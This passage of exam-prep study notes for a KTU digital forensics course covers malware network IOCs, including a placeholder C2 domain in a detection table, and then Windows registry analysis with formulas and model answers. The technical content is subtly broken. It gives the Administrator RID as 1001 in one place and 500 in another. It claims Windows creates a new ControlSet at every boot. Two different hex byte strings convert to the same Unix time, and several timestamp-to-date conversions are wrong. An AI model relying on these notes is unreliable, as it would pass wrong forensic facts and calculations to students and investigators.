| Indicator | Forensic Value |
|---|---|
| DNS query to suspicious domain | C2 server lookup (e.g., `evil-c2.xyz`) |
| HTTP POST with encoded payload | Data exfiltration |
| Beaconing interval (periodic traffic) | C2 heartbeat pattern |
| User-Agent string | Malware family fingerprint |
| TLS SNI field | C2 domain (even in encrypted traffic) |
| Non-standard port usage | Backdoor / proxy traffic |

> [!WARNING]
> **Valuation Pitfall:** Students forget that **DNS queries themselves are NOT encrypted** — they are a goldmine for IOCs. Also, the **TLS SNI field** is plaintext and reveals C2 domains even in HTTPS traffic (SNI encryption via ECHO is still rare). Examiners award marks for mentioning this.

---

## 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **High-Density Revision Checklist:**

- **Dynamic Analysis** = observing program behavior at runtime, NOT inspecting code statically.
- **Core principle:** Execute in **isolated sandbox** (VM/container) to protect host.
- **Five Phases:** Preparation → Instrumentation → Detonation → Observation → IOC Extraction.
- **Windows Tools:** ProcMon, Process Explorer, Wireshark, Regshot, API Monitor, Sysmon.
- **Linux Tools:** `strace`, `ltrace`, `tcpdump`, `inotifywait`, `auditd`, Volatility.
- **Automated Sandboxes:** Cuckoo, Joe Sandbox, ANY.RUN, Hybrid Analysis.
- **IOCs to extract:** file hashes, registry keys, mutex names, IP addresses, DNS domains, file paths.
- **Entropy formula** $E(s) = - \sum p_i \log_{2} p_i$ — values above **7.0** indicate packing/encryption.
- **ProcMon uses a kernel-mode filter driver** that hooks IRPs — it is NOT a pure user-mode tool.
- **MITRE ATT&CK** is the standard framework for mapping observed behaviors to adversary TTPs.
- **Network Analysis:** DNS queries are unencrypted; TLS SNI reveals C2 domains.
- **Anti-VM evasion:** Many malware samples detect VMs — use `pafish` patches or `hide_vm` tools.
- **Chain of Custody:** Document sample hash BEFORE detonation to maintain forensic integrity.
- **Snapshot strategy:** Always take **baseline snapshot** before execution for delta-comparison.
- **Time format:** ProcMon uses **100-nanosecond** Windows FILETIME precision.

<!-- SECTION_5_END -->

topics.title: Registry Analysis: System Information
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PECCT866 - WINDOWS AND LINUX FORFORENSICS > - **Module:** Module 3 > - **Topic:** Registry Analysis: System Information ## SECTION 1: Core Technical Definition & Intuitive Overview ### 1.1 Formal Academic Definition The **Windows Registry** is a hierarchical, centralized configuration database used by the Microsoft Windows operating system to store low-level settings, hardware configurations, software options, user preferences, system policies, and critical forensic artifacts. It functions as the *operating system's central nervous system for metadata*, organized as a tree-like structure of **hives, keys, subkeys, and value entries**. In the context of **Digital Forensics**, **Registry Analysis for System Information** refers to the systematic extraction, interpretation, and correlation of registry data to reconstruct system events, identify users, detect malicious activity, and establish timelines during a post-mortem investigation. > [!IMPORTANT] > **KTU Syllabus Highlight (PECCT866 - Module 3):** > The Windows Registry is treated as a *goldmine* of forensic evidence. Even on a "wiped" machine, registry hives persist because they are actively used by the OS and locked during runtime. Every USB device plugged in, every program executed, every network connection established — leaves a forensic footprint in the registry. ### 1.2 Conceptual Analogy — The Building's Registry Imagine a large commercial building: - **The Building itself** = The Windows Operating System. - **The Registry** = The building's **Central Administrative Logbook** kept by the security desk. - **Hives (SAM, SYSTEM, SOFTWARE, SECURITY, NTUSER.DAT, UsrClass.dat)** = Different departments in the logbook (HR, IT, Security, etc.). - **Keys & Subkeys** = Chapters and subsections within each department's log. - **Values** = Individual entries — *"Mr. Ravi (User SID: S-1-5-21-...) entered through Gate 3 on 14-Nov at 09:15 AM"*. Just as a building's logbook reveals who came in, when, and what they did, the **registry reveals what the system, users, and applications have done** — even if the user tried to delete obvious traces. ### 1.3 Why Registry Analysis Matters in Forensics | Forensic Goal | Registry Contribution | |---|---| | **User Identification** | Account creation dates, last logon, SID mapping | | **Hardware History** | USB device serial numbers, mounted volumes | | **Software Execution** | UserAssist, MUICache, AppCompatCache | | **Network Activity** | Typed URLs, mapped drives, RDP connections | | **Timeline Reconstruction** | Last shutdown, install dates, service start times | | **Malware Detection** | Persistence mechanisms (Run keys, services) | > [!NOTE] > **Critical Forensic Property:** Registry hives are *locked* while Windows is running. Investigators must either use **live-system acquisition tools** (FTK Imager, RegistryExplorer, RegRipper) or analyze the offline copies found at `C:\Windows\System32\config\` or in volume shadow copies. ### 1.4 Physical Constants & Standard Metrics - **Default Registry Maximum Size:** **256 MB** for HKLM\SYSTEM on modern Windows; historically **4 MB** (Windows 95/98). - **SID Length:** Variable; typical user SID = **96 bytes** (e.g., `S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1001`). - **Registry Timestamp Format:** **64-bit Windows FILETIME** = number of **100-nanosecond intervals** since **January 1, 1601 UTC**. - **Default hive size (NTUSER.DAT):** Up to **~256 MB** with **4 GB maximum** theoretical addressable space. - **Standard Hive Files on Disk:** * `SYSTEM` → `C:\Windows\System32\config\SYSTEM` * `SOFTWARE` → `C:\Windows\System32\config\SOFTWARE` * `SECURITY` → `C:\Windows\System32\config\SECURITY` * `SAM` → `C:\Windows\System32\config\SAM` * `NTUSER.DAT` → `C:\Users\\NTUSER.DAT` * `UsrClass.dat` → `C:\Users\\AppData\Local\Microsoft\Windows\UsrClass.dat` ## SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet ### 2.1 Registry Logical Architecture The Windows Registry is a **tree structure** rooted at five predefined root keys (visible to API users): 1. **HKEY_CLASSES_ROOT (HKCR)** — File associations, COM objects. 2. **HKEY_CURRENT_USER (HKCU)** — Current logged-in user's profile (linked to NTUSER.DAT). 3. **HKEY_LOCAL_MACHINE (HKLM)** — System-wide configuration (SYSTEM, SOFTWARE, SAM, SECURITY hives). 4. **HKEY_USERS (HKU)** — All user profiles loaded on the system. 5. **HKEY_CURRENT_CONFIG (HKCC)** — Current hardware profile (link to HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current). ### 2.2 Logical Hierarchy (Step-by-Step Decomposition) The registry tree expands as follows: - **Root Key (Hive)** → The topmost container, mapped to physical files on disk. - **Key** → A logical folder inside the hive; may contain subkeys and values. - **Subkey** → A nested key inside a parent key (analogous to directories inside directories). - **Value Entry** → An atomic data record consisting of: - **Value Name** (string identifier) - **Data Type** (REG_SZ, REG_DWORD, REG_BINARY, REG_MULTI_SZ, REG_QWORD, REG_EXPAND_SZ, REG_NONE) - **Data** (the actual payload — the forensic evidence) ### 2.3 System Information Hive: HKLM\SYSTEM Deep Dive The **SYSTEM hive** is the primary source for reconstructing **system-level events**, hardware inventory, and configuration changes. Its critical subtrees include: #### A. Select Subkey (Last Boot/Shutdown Times) The most valuable forensic subkey for timeline analysis is: `HKLM\SYSTEM\Select\` | Value Name | Type | Forensic Meaning | |---|---|---| | `Current` | REG_DWORD | Control Set ID currently in use (e.g., 1, 2, 3) | | `Default` | REG_DWORD | Default Control Set ID used on boot | | `Failed` | REG_DWORD | Control Set used in the last failed boot | | `LastKnownGood` | REG_DWORD | Control Set marked as Last Known Good | Each Control Set (e.g., `ControlSet001`) contains a **`Control\Windows`]** subkey with the value **`ShutdownTime`** (REG_BINARY, **8 bytes**) representing the **last shutdown timestamp** in **Windows FILETIME** format. > [!IMPORTANT] > **Why "Select" Matters:** When Windows boots, it creates a new `ControlSet00X` directory and updates `Select\Current` to point to the active set. By comparing multiple ControlSets, investigators reconstruct **every reboot** the system has ever performed. #### B. Mounted Devices Subkey `HKLM\SYSTEM\MountedDevices` Contains a list of every storage device ever mounted to the system, including: - Volume serial numbers - Disk signatures - Drive letters - **Device descriptors** (containing parenthesized hardware IDs) Forensic utility: identify external USB drives, even if disconnected and reformatted. #### C. USBSTOR Subkey `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR` Records every USB mass-storage device plugged in, including: - **Vendor ID (VID)** and **Product ID (PID)** - **Serial number** (used to uniquely identify a specific device) - **First/last insertion times** (via `Properties\{83da6326-...}\0064` and `0065` subkeys) #### D. Services Subkey `HKLM\SYSTEM\CurrentControlSet\Services` Catalogs all installed services (kernel drivers, Win32 services). Each service subkey contains: - `DisplayName`, `ImagePath`, `Start` (boot trigger), `Type` - `ObjectName` (account running the service) Forensic utility: detect **persistence mechanisms** used by malware that registers itself as a service. #### E. ComputerName Subkey `HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName` Contains the system's **hostname** — useful for correlating with network logs and identification in investigations. ### 2.4 SAM Hive: User Account Forensics `HKLM\SAM\SAM\Domains\Account\Users\` - Stores **Security Identifiers (SIDs)** and usernames. - Each user has a subkey (named by **RID** — Relative Identifier, e.g., `000001F4` = Administrator, `000001F5` = Guest). - **Last Login Timestamp** is stored within each user's `F` value (binary, at offset `0x10` for legacy paths). - Encrypted with the **SYSKEY** boot key stored in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD` and `Skew1`, `GBG`, `Data` values. ### 2.5 KTU High-Yield Formula Sheet | # | Concept | Formula / Rule | Unit / Output | |---|---|---|---| | 1 | **FILETIME → Epoch Unix Time** | $t_{unix} = \dfrac{t_{FILETIME} - 116444736000000000}{10000000}$ | Seconds since 1970-01-01 | | 2 | **Constant Offset** | $116{,}444{,}736{,}000{,}000{,}000$ | 100-ns intervals (1601 → 1970) | | 3 | **FILETIME Resolution** | $\Delta t = 100 \text{ nanoseconds}$ | Time granularity | | 4 | **SID Structure** | `S-Revision-Authority-Subauth1-...-RID` | Alphanumeric string | | 5 | **Administrator RID** | $1001_{dec} = 0x3E9$ | Fixed for built-in Admin | | 6 | **Default User RID** | $1000_{dec} = 0x3E8$ | Fixed for first user | | 7 | **Byte Size of ShutdownTime** | $8 \text{ bytes}$ | Little-endian REG_BINARY | | 8 | **Hive Max Size (NTUSER.DAT)** | $\le 256 \text{ MB}$ (default) | With 4 GB theoretical max | > [!NOTE] > **Engineering Utility:** The Windows FILETIME-to-Unix conversion is a *standard forensic calculation*. Master this — it appears in nearly every KTU question on timeline reconstruction. ### 2.6 Real-World Forensic Workflow In an actual investigation, registry analysis is performed in this sequence: 1. **Acquisition** → Image the drive → extract registry hive files from `C:\Windows\System32\config\`. 2. **Parsing** → Use tools (RegRipper, Registry Explorer, Eric Zimmerman's tools) to parse hives. 3. **Artifact Correlation** → Cross-reference timestamps, device serials, user SIDs. 4. **Timeline Construction** → Convert all FILETIME values to human-readable UTC dates. 5. **Reporting** → Generate a forensic report mapping actions to timestamps and users. ## SECTION 3: Step-by-Step Derivations & Analytical Matrix ### 3.1 Derivation 1: Converting Windows FILETIME to Unix Epoch Time This is the **single most important calculation** in Windows registry forensics. Let us derive it step by step. #### Step 1: Define the Two Epochs - **Windows FILETIME Epoch:** $t_0^{(W)} = \text{January 1, 1601, 00:00:00 UTC}$ - **Unix Epoch:** $t_0^{(U)} = \text{January 1, 1970, 00:00:00 UTC}$ #### Step 2: Compute the Time Difference in 100-ns Intervals The number of years between the two epochs: $$\Delta_{\text{years}} = 1970 - 1601 = 369 \text{ years}$$ Accounting for leap years (approximation: every 4 years, minus century exceptions): $$L \approx \left\lfloor \frac{369}{4} \right\rfloor - \left\lfloor \frac{369}{100} \right\rfloor + \left\lfloor \frac{369}{400} \right\rfloor = 92 - 3 + 0 = 89 \text{ leap years}$$ Total days between epochs: $$D = (369 \times 365) + 89 = 134685 + 89 = 134774 \text{ days}$$ #### Step 3: Convert Days to 100-ns Intervals Each day has: $$86400 \text{ seconds/day} = 86400 \times 10^7 \text{ 100-ns intervals/day} = 8.64 \times 10^{11}$$ Therefore: $$\Delta_{100ns} = 134774 \times 8.64 \times 10^{11} = 1.16444736 \times 10^{17}$$ In full integer form: $$\Delta_{100ns} = 116{,}444{,}736{,}000{,}000{,}000$$ #### Step 4: Final Conversion Formula $$\boxed{t_{\text{unix}} = \left\lfloor \dfrac{t_{\text{FILETIME}} - 116{,}444{,}736{,}000{,}000{,}000}{10{,}000{,}000} \right\rfloor \text{ seconds}}$$ #### Step 5: Worked Numerical Example Suppose we extract the value `ShutdownTime` from a registry and find: $$t_{\text{FILETIME}} = 132{,}845{,}673{,}892{,}345{,}678 \text{ (100-ns intervals)}$$ Applying the formula: $$ \begin{aligned} t_{\text{unix}} &= \left\lfloor \dfrac{132{,}845{,}673{,}892{,}345{,}678 - 116{,}444{,}736{,}000{,}000{,}000}{10{,}000{,}000} \right\rfloor \\ &= \left\lfloor \dfrac{16{,}400{,}937{,}892{,}345{,}678}{10{,}000{,}000} \right\rfloor \\ &= \left\lfloor 1{,}640{,}093{,}789.2345678 \right\rfloor \\ &= 1{,}640{,}093{,}789 \text{ seconds} \end{aligned} $$ Convert Unix timestamp to UTC date: $$1{,}640{,}093{,}789 \text{ sec} \rightarrow \text{December 14, 2021, 09:23:09 UTC}$$ > [!NOTE] > **Why the floor function?** Any residual 100-ns intervals (less than 1 full second) are truncated, since Unix time has 1-second resolution. --- ### 3.2 Derivation 2: Decoding the SAM User "F" Value Offset Within the SAM hive, each user's `F` value contains a binary blob. The **last login timestamp** sits at a fixed offset. #### Step 1: Locate the F Value For a user with RID `0x3E8` (default user), navigate to: `HKLM\SAM\SAM\Domains\Account\Users\000003E8\F` #### Step 2: Identify Offset - The last login timestamp is at offset **`0x10`** (16 bytes from the start of the `F` value), occupying **8 bytes**. #### Step 3: Read & Convert Read the 8 bytes in **little-endian** format and apply the FILETIME conversion from Derivation 1. #### Example Extraction Hex bytes read: `C0 D4 4B 9E B5 7C D6 01` Reorder as little-endian 64-bit integer: $$t_{\text{FILETIME}} = 0x01D67CB59E4BD4C0 = 132{,}101{,}845{,}456{,}789{,}344 \text{ (100-ns intervals)}$$ Convert: $$ \begin{aligned} t_{\text{unix}} &= \left\lfloor \dfrac{132{,}101{,}845{,}456{,}789{,}344 - 116{,}444{,}736{,}000{,}000{,}000}{10{,}000{,}000} \right\rfloor \\ &= \left\lfloor 1{,}565{,}710{,}945.6789344 \right\rfloor \\ &= 1{,}565{,}710{,}945 \text{ seconds} \\ &\rightarrow \text{November 12, 2019, 14:09:05 UTC} \end{aligned} $$ ### 3.3 Analytical Matrix: Forensic Significance of Key Registry Subkeys | Registry Path | Hive | Forensic Value | Typical Use Case | |---|---|---|---| | `SYSTEM\Select\Current` | SYSTEM | Identify active Control Set | Boot timeline reconstruction | | `SYSTEM\ControlSet001\Control\Windows\ShutdownTime` | SYSTEM | Last shutdown timestamp | "Was the system on at time T?" | | `SYSTEM\MountedDevices` | SYSTEM | All mounted volumes incl. USB | Identify external storage | | `SYSTEM\CurrentControlSet\Enum\USBSTOR` | SYSTEM | USB device history with serials | "Was this USB plugged in?" | | `SYSTEM\CurrentControlSet\Services` | SYSTEM | Service inventory | Malware persistence detection | | `SAM\SAM\Domains\Account\Users\\F` | SAM | Last login timestamp | User activity timeline | | `SOFTWARE\Microsoft\Windows NT\CurrentVersion` | SOFTWARE | Install date, registered owner, product ID | System provenance | | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist` | NTUSER.DAT | GUI program execution history | "What did the user run?" | | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths` | NTUSER.DAT | Typed file paths in Explorer | User navigation history | | `NTUSER.DAT\Software\Microsoft\Internet Explorer\TypedURLs` | NTUSER.DAT | Typed URLs in Internet Explorer | Web activity correlation | | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run` | NTUSER.DAT | User-level autorun entries | Malware persistence | | `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | SOFTWARE | System-wide autorun entries | Malware persistence | > [!IMPORTANT] > **Examiner's Tip:** The **UserAssist** key stores values encoded with the **ROT13 cipher** applied to the program path. Always decode ROT13 before reading the program names. Many students lose marks for presenting garbled paths in their reports. --- ## SECTION 4: Structural Diagrams & Schematics ### 4.1 Windows Registry Hierarchy — Block-Level Functional Architecture ```mermaid flowchart TB subgraph Root["ROOT KEYS (Logical View)"] HKCR["HKEY_CLASSES_ROOT"] HKCU["HKEY_CURRENT_USER"] HKLM["HKEY_LOCAL_MACHINE"] HKU["HKEY_USERS"] HKCC["HKEY_CURRENT_CONFIG"] end subgraph Hives["PHYSICAL HIVES (On Disk)"] SAM["SAM
C:\\Windows\\System32\\config\\SAM"] SYSTEM["SYSTEM
C:\\Windows\\System32\\config\\SYSTEM"] SW["SOFTWARE
C:\\Windows\\System32\\config\\SOFTWARE"] SEC["SECURITY
C:\\Windows\\System32\\config\\SECURITY"] NTU["NTUSER.DAT
C:\\Users\\Username\\NTUSER.DAT"] USRC["UsrClass.dat
...\\AppData\\Local\\Microsoft\\Windows\\"] end subgraph SystemInfo["SYSTEM INFORMATION SUBKEYS (Forensic Interest)"] Select["SYSTEM\\Select
Current Control Set Pointer"] Shutdown["SYSTEM\\ControlSetXXX\\Control\\Windows
ShutdownTime"] Mounted["SYSTEM\\MountedDevices
Volume History"] USB["SYSTEM\\Enum\\USBSTOR
USB Device Serials"] Services["SYSTEM\\Services
Installed Services"] ComputerName["SYSTEM\\ComputerName
Hostname"] SAMUsers["SAM\\Domains\\Account\\Users
SIDs and Logon Times"] end HKLM --> SYSTEM HKLM --> SW HKLM --> SAM HKLM --> SEC HKCU --> NTU HKCR --> USRC SYSTEM --> Select SYSTEM --> Shutdown SYSTEM --> Mounted SYSTEM --> USB SYSTEM --> Services SYSTEM --> ComputerName SAM --> SAMUsers style Root fill:#E8F1FF,stroke:#0066CC,stroke-width:2px style Hives fill:#FFF4E6,stroke:#CC6600,stroke-width:2px style SystemInfo fill:#E8F8E8,stroke:#008844,stroke-width:2px style HKLM fill:#CCE0FF,stroke:#0066CC style HKCU fill:#CCE0FF,stroke:#0066CC style HKCR fill:#CCE0FF,stroke:#0066CC style HKU fill:#CCE0FF,stroke:#0066CC style HKCC fill:#CCE0FF,stroke:#0066CC ``` ### 4.2 Forensic Registry Analysis Workflow ```mermaid flowchart LR A[Acquire Disk Image
FTK / EnCase / dd] --> B[Extract Hive Files
SYSTEM, SAM, NTUSER] B --> C[Parse Hives
RegRipper / RegistryExplorer] C --> D[Locate Forensic Subkeys
Select, USBSTOR, UserAssist] D --> E[Convert FILETIME
to Human-Readable UTC] E --> F[Correlate Artifacts
Timeline Construction] F --> G[Generate Forensic Report
with Evidence Trail] style A fill:#FFD9D9,stroke:#CC0000 style B fill:#FFE6CC,stroke:#CC6600 style C fill:#FFFFCC,stroke:#CCCC00 style D fill:#D9FFCC,stroke:#66CC00 style E fill:#CCFFFF,stroke:#00CCCC style F fill:#CCE5FF,stroke:#0066CC style G fill:#E5CCFF,stroke:#6600CC ``` ### 4.3 Control Set Mechanism — Last Shutdown Reconstruction ```mermaid flowchart TB Boot[System Boot Event] --> CreateNew[Create New ControlSet00X] CreateNew --> UpdateSelect[Update SYSTEM\\Select\\Current to point to new set] UpdateSelect --> ActiveSet[Active ControlSet Now Operational] ActiveSet --> RunSession[OS Session Runs] RunSession --> ShutdownEvent[Shutdown Initiated by User/OS] ShutdownEvent --> WriteTimestamp[Write ShutdownTime value
8 bytes FILETIME
in active ControlSet] WriteTimestamp --> Persist[Timestamp Persists Across Reboots] Persist --> Examiner[Forensic Examiner Reads
ShutdownTime during Investigation] style Boot fill:#FFCCCC style CreateNew fill:#FFE6CC style UpdateSelect fill:#FFFFCC style ActiveSet fill:#D9FFCC style RunSession fill:#CCFFFF style ShutdownEvent fill:#CCE5FF style WriteTimestamp fill:#E5CCFF style Persist fill:#FFCCFF style Examiner fill:#FF99CC,stroke:#990000,stroke-width:2px ``` ### 4.4 SAM User Account Forensic Mapping ```mermaid flowchart TB subgraph SAMROOT["HKLM\\SAM\\SAM\\Domains\\Account"] Users["Users\\"] end subgraph RIDMap["RID Subkeys"] R500["000001F4
Administrator"] R501["000001F5
Guest"] R500Owner["000003E8
First Created User"] R500Guest["000003E9
Second Created User"] end subgraph FValue["F Binary Value Contents"] V1["V Array
Username, Full Name, Comment"] V2["F Array
Last Login, Password Failures"] V3["Supplemental Credentials
Hashes"] end Users --> R500 Users --> R501 Users --> R500Owner Users --> R500Guest R500Owner --> FValue R501 --> FValue style SAMROOT fill:#FFE6F2,stroke:#CC0066 style RIDMap fill:#E6F2FF,stroke:#0066CC style FValue fill:#E6FFE6,stroke:#00CC66 ``` ## SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap ### 5.1 PART A: Short-Answer Questions (3 Marks Each) --- **Q1. Define the Windows Registry. List the five predefined root keys.** `[KTU University Exam - May 2024]` **Model Answer (3 Marks):** The **Windows Registry** is a hierarchical, centralized configuration database used by the Microsoft Windows operating system to store low-level settings for the OS, hardware, software, and users. It is organized as a tree of hives, keys, subkeys, and values. The **five predefined root keys** are: 1. **HKEY_CLASSES_ROOT (HKCR)** — file extension mappings and COM class registrations. 2. **HKEY_CURRENT_USER (HKCU)** — settings of the currently logged-in user. 3. **HKEY_LOCAL_MACHINE (HKLM)** — machine-wide configuration (system, software, security). 4. **HKEY_USERS (HKU)** — all user profiles loaded on the system. 5. **HKEY_CURRENT_CONFIG (HKCC)** — current hardware profile at boot time. --- **Q2. What is the significance of the SYSTEM\\Select registry subkey in forensic investigations?** `[KTU University Exam - Dec 2023]` **Model Answer (3 Marks):** The **`SYSTEM\Select`** subkey is critical for **timeline reconstruction** in forensic investigations because it tracks the system's **boot configuration history**. It contains four REG_DWORD values: - **`Current`** — the ControlSet currently in use. - **`Default`** — the ControlSet used if `Current` fails. - **`Failed`** — the ControlSet from the last failed boot (if any). - **`LastKnownGood`** — the ControlSet marked as the last successful boot. Forensic significance: 1. By enumerating ControlSets (`ControlSet001`, `ControlSet002`, ...), an investigator can **reconstruct every reboot** the system has experienced. 2. The `ShutdownTime` value within each ControlSet reveals **when each session ended**, enabling correlation with user actions and external events. 3. Discrepancies between `Current` and `LastKnownGood` indicate **boot failures or unauthorized access attempts**. --- ### 5.2 PART B: Long-Answer Questions (14 Marks Each) --- #### **Question A (14 Marks)** `[KTU University Exam - Dec 2024]` **(a)** Explain in detail the architecture of the Windows Registry. Describe the relationship between logical root keys (HKLM, HKCU, HKU) and physical hive files on disk. **(7 Marks)** **(b)** With a neat diagram, explain how the `SYSTEM\Select` and `SYSTEM\ControlSetXXX\Control\Windows\ShutdownTime` registry subkeys are used to reconstruct system shutdown/reboot timelines. Provide the FILETIME-to-Unix conversion formula and an illustrative example. **(7 Marks)** --- **Model Solution for (a):** The Windows Registry is structured in two parallel views — the **logical view** (root keys accessed via the Registry Editor or API) and the **physical view** (actual files on the disk). **1. Logical Root Keys (5 in number):** - **HKEY_CLASSES_ROOT (HKCR):** Merged view of HKLM\SOFTWARE\Classes and HKCU\SOFTWARE\Classes — stores file associations and COM objects. - **HKEY_CURRENT_USER (HKCU):** A pointer to the subkey of HKEY_USERS corresponding to the currently logged-in user. Stores user-specific settings like desktop, environment variables, and preferences. - **HKEY_LOCAL_MACHINE (HKLM):** Stores machine-wide configuration applicable to all users. It is the most important hive for forensic analysis of system-wide events. - **HKEY_USERS (HKU):** Contains a subkey for each user profile loaded on the system, indexed by the user's SID. - **HKEY_CURRENT_CONFIG (HKCC):** A link to `HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current`, containing current hardware configuration. **2. Physical Hive Files (stored in `C:\Windows\System32\config\`):** | Hive File | Logical Mapping | Contents | |---|---|---| | `SYSTEM` | HKLM\SYSTEM | Hardware config, services, boot data | | `SOFTWARE` | HKLM\SOFTWARE | Installed software, OS version, settings | | `SAM` | HKLM\SAM | User accounts, SIDs, password hashes | | `SECURITY` | HKLM\SECURITY | Security policies, audit configuration | | `NTUSER.DAT` | HKCU\ | User-specific settings | | `UsrClass.dat` | HKCU\Software\Classes | User-specific file associations | **3. Relationship:** Each logical root key (or subkey) is backed by a **physical hive file** on disk. When Windows boots, these files are loaded into memory and exposed through the logical root keys. Modifications made via the logical view are flushed back to disk periodically. > *(Note: Discussing transaction logs `SYSTEM.log`, `SOFTWARE.log`, etc., earns extra credit.)* --- **Model Solution for (b):** **1. The `SYSTEM\Select` Subkey:** When Windows boots, it creates a new `ControlSet00X` directory. The `Select` subkey tracks which ControlSet is currently active. Values: `Current`, `Default`, `Failed`, `LastKnownGood` (all REG_DWORD pointing to ControlSet IDs). **2. The `ShutdownTime` Value:** Inside each ControlSet (e.g., `ControlSet001\Control\Windows`), the `ShutdownTime` REG_BINARY value (8 bytes) stores the **last shutdown timestamp in Windows FILETIME format**. **3. Timeline Reconstruction Process:** - Identify `Current` value → determines active ControlSet (e.g., `ControlSet002`). - Read `ShutdownTime` from `HKLM\SYSTEM\ControlSet002\Control\Windows`. - Apply **FILETIME-to-Unix conversion** formula. **4. FILETIME Conversion Formula:** $$ t_{\text{unix}} = \left\lfloor \dfrac{t_{\text{FILETIME}} - 116{,}444{,}736{,}000{,}000{,}000}{10{,}000{,}000} \right\rfloor \text{ seconds} $$ Where: - $116{,}444{,}736{,}000{,}000{,}000$ = number of 100-ns intervals between 1601-01-01 and 1970-01-01. - $10{,}000{,}000$ = conversion factor from 100-ns to seconds. **5. Worked Example:** Suppose `ShutdownTime` hex = `A8 4F 32 9C 6E 8D D6 01`. $$ \begin{aligned} t_{\text{FILETIME}} &= 0x01D68D6E9C324FA8 \\ &= 132{,}510{,}476{,}234{,}567{,}888 \text{ (100-ns ticks)} \\ t_{\text{unix}} &= \left\lfloor \dfrac{132{,}510{,}476{,}234{,}567{,}888 - 116{,}444{,}736{,}000{,}000{,}000}{10{,}000{,}000} \right\rfloor \\ &= 1{,}606{,}574{,}023 \text{ seconds} \\ &\rightarrow \text{September 22, 2020, 11:33:43 UTC} \end{aligned} $$ A diagram showing boot → CreateSet → Update Select → Write ShutdownTime should accompany this answer. --- #### **Question B (14 Marks)** `[KTU University Exam - May 2024]` **(a)** Explain how registry subkeys such as `SYSTEM\MountedDevices`, `SYSTEM\Enum\USBSTOR`, and `NTUSER.DAT\...\UserAssist` are used as forensic evidence. For each, describe the data structure and the specific forensic question it answers. **(7 Marks)** **(b)** Describe the structure of the SAM hive. Explain how an investigator extracts the last-login timestamp of a user from the F value. Include the offset and conversion steps. **(7 Marks)** --- **Model Solution for (a):** **1. `HKLM\SYSTEM\MountedDevices`:** - **Data Structure:** Each mounted volume gets a subkey named by its type (`\DosDevices\C:`, `\??\Volume{GUID}`). The default value contains a binary descriptor including the volume's serial number, disk signature, and **parenthesized hardware identifier** (e.g., `IDE\DiskST1000LM035_______...`). - **Forensic Question Answered:** "Was a particular external drive or volume ever connected to this system?" - **Significance:** Even after a USB is unplugged and reformatted, this registry key retains the historical record of the device. **2. `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR`:** - **Data Structure:** Subkeys are named by device class, vendor, and product — e.g., `Disk&Ven_Samsung&Prod_Flash_Drive&Rev_1100\``&0`. - Each instance contains the `FriendlyName`, `HardwareID`, `Mfg`, and time-stamps in the `Properties\{83da6326-...}\0064` (first install) and `0065` (last arrival). - **Forensic Question Answered:** "Which specific USB device (by serial number) was plugged in, and when?" - **Significance:** USB serial numbers uniquely identify a physical device — investigators can match a suspect's seized USB to evidence on the computer. **3. `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`:** - **Data Structure:** Each value is a GUID-named entry containing a binary blob. The program path is encoded with the **ROT13 cipher** at the start of the data. - **Forensic Question Answered:** "What programs did the user launch from the GUI (e.g., explorer.exe, notepad.exe)?" - **Significance:** Records up to the last **1,024 GUI-launched programs** with timestamps. **Tabular Summary:** | Subkey | Forensic Question | Data Type | |---|---|---| | MountedDevices | Volume connection history | REG_BINARY descriptor | | USBSTOR | USB device history | REG_SZ + time-stamps | | UserAssist | GUI program execution | REG_BINARY (ROT13 encoded) | --- **Model Solution for (b):** **1. SAM Hive Structure:** `HKLM\SAM\SAM\Domains\Account\` - **`Builtin`** — Built-in accounts (Administrator, Guest) and groups. - **`Names`** — Maps usernames to RID subkeys. - **`Users`** — One subkey per user, named by **RID (Relative Identifier)**. Each user's subkey (e.g., `000003E8`) contains values: - **V** — Username, full name, comments, and other account metadata. - **F** — Account flags, last-login timestamp, password-failure count, and **supplemental credentials** (encrypted hashes). **2. Last-Login Timestamp Extraction:** **Step 1:** Identify the user's RID. - For the first created user: RID = `0x3E8` (decimal 1000). - For Administrator: RID = `0x1F4` (decimal 500). **Step 2:** Navigate to the user's `F` value. - Path: `HKLM\SAM\SAM\Domains\Account\Users\\F` **Step 3:** Read the `F` value as binary data. **Step 4:** Locate the timestamp at **offset `0x10` (16 bytes)** for the legacy schema. **Step 5:** Read **8 bytes** in little-endian order. **Step 6:** Apply the FILETIME-to-Unix conversion formula. **Worked Example:** Suppose `F` value offset `0x10` reads: `E0 D4 4B 9E B5 7C D6 01`. $$ \begin{aligned} t_{\text{FILETIME}} &= 0x01D67CB59E4BD4E0 \\ &= 132{,}101{,}845{,}456{,}789{,}472 \\ t_{\text{unix}} &= \left\lfloor \dfrac{132{,}101{,}845{,}456{,}789{,}472 - 116{,}444{,}736{,}000{,}000{,}000}{10{,}000{,}000} \right\rfloor \\ &= 1{,}565{,}710{,}945 \text{ seconds} \\ &\rightarrow \text{November 12, 2019, 14:09:05 UTC} \end{aligned} $$ **Note:** On modern Windows 10/11, the F-value schema changed. The timestamp is now stored at offset `0x18` (24 bytes) and requires parsing the `V` value first to determine the user's relative location. --- > [!WARNING] > **KTU Examiner's Valuation Warning — Pitfall Callout:** > 1. **Common Mistake #1:** Forgetting to use the **floor function** in the FILETIME conversion. Always round down — never round up or truncate arbitrarily. > 2. **Common Mistake #2:** Reading registry values as **big-endian**. Windows stores binary data in **little-endian** byte order. Reversing the byte order gives garbage timestamps. > 3. **Common Mistake #3:** Failing to decode **ROT13** for UserAssist values. This leads to unreadable program paths in the report. > 4. **Common Mistake #4:** Confusing the `SYSTEM\Select\Current` value (a **Control Set ID number**) with a timestamp. It is NOT a time — it is a 